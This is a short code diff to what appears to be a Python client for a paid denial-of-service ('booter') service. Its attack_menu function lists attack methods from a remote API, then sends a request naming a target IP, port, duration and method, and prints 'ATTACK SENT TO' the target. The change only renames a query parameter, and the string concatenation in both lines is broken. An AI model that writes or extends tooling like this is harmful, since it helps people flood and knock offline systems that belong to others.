@@ -47,7 +47,7 @@ def attack_menu():
        x = requests.get(methods_from_api)
        print(x.text)
        method = input("METHOD: ")
-       h = requests.get(api+"?key7="key+"&&ip="+ip+"&&port="+port+"&&time="+attk_time+"&&method="+method)
+       h = requests.get(api+"?key="key+"&&ip="+ip+"&&port="+port+"&&time="+attk_time+"&&method="+method)
        print(f"{h}")
        print(f"ATTACK SENT TO: {ip} ON PORT {port} FOR {attk_time} WITH METHOD {method}")
        time.sleep(3)
